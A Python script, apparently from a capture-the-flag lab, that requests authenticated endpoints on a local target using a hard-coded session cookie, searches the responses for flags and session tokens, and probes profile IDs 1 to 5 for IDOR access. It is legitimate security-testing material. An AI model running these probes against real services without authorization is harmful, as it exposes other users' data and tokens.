import requests
import re

# Base URL for the application
base_url = "http://127.0.0.1"

# Session cookie from context
session_cookie = "1COpdQzZxvmSuiNtAtD1eijj_1JQeeZkIZtddX9egps"
cookies = {'session': session_cookie}

# Standard authenticated endpoints to test
endpoints = [
    '/',
    '/profile',
    '/dashboard',
    '/api/user'
]

print("=" * 60)
print("Authenticated Endpoint Testing")
print(f"Base URL: {base_url}")
print(f"Session Cookie: {session_cookie[:20]}...")
print("=" * 60)

# Test each endpoint
for endpoint in endpoints:
    url = f"{base_url}{endpoint}"
    print(f"\n[+] Testing endpoint: {endpoint}")
    print(f"[+] URL: {url}")
    
    try:
        response = requests.get(url, cookies=cookies, timeout=10)
        
        # Print response details
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Content Length: {len(response.content)} bytes")
        
        # Print interesting headers
        interesting_headers = ['content-type', 'server', 'set-cookie', 'location']
        for header, value in response.headers.items():
            if header.lower() in interesting_headers:
                print(f"[+] Header {header}: {value}")
        
        # Search for flag in response
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!] FLAG FOUND: {flag_match.group()}")
            print(f"[!] Full response:\n{response.text}")
        elif response.status_code == 200:
            # For successful responses, show a snippet
            print(f"[+] Response snippet:\n{response.text[:500]}")
            if len(response.text) > 500:
                print(f"[+] ... (truncated, full length: {len(response.text)} bytes)")
        else:
            print(f"[!] Error response: {response.text[:200]}")
            
        # Check for session or auth tokens in response
        token_matches = re.findall(r'(token|session|jwt|bearer)[:=]\s*([a-zA-Z0-9_\-\.]+)', response.text, re.I)
        if token_matches:
            print(f"[!] Possible tokens found: {token_matches}")
            
    except requests.exceptions.Timeout:
        print(f"[!] Timeout accessing {endpoint}")
    except requests.exceptions.ConnectionError:
        print(f"[!] Connection error accessing {endpoint}")
    except Exception as e:
        print(f"[!] Error accessing {endpoint}: {str(e)}")

print("\n" + "=" * 60)
print("Endpoint testing complete")
print("=" * 60)

# Search for any additional clues in response patterns
# Try to access any discovered endpoints if redirects or links are found
# This is a reconnaissance phase to map the application

# Also test if the session can access different user contexts (IDOR testing)
# by varying user IDs or profile identifiers

print("\n[+] Testing for IDOR vulnerabilities...")
for user_id in range(1, 6):  # Test user IDs 1-5
    url = f"{base_url}/profile/{user_id}"
    print(f"\n[+] Testing: {url}")
    
    try:
        response = requests.get(url, cookies=cookies, timeout=5)
        print(f"[+] Status: {response.status_code} | Length: {len(response.content)}B")
        
        # Check for flag
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!] FLAG FOUND: {flag_match.group()}")
            print(f"[!] Response: {response.text}")
            
        # Check for different content than unauthorized
        if response.status_code == 200 and len(response.content) > 100:
            print(f"[+] Access to user {user_id} profile granted")
            print(f"[+] Content preview: {response.text[:200]}")
            
    except requests.exceptions.Timeout:
        print(f"[!] Timeout")
    except Exception as e:
        print(f"[!] Error: {str(e)}")

print("\n" + "=" * 60)
print("IDOR testing complete")
print("=" * 60)
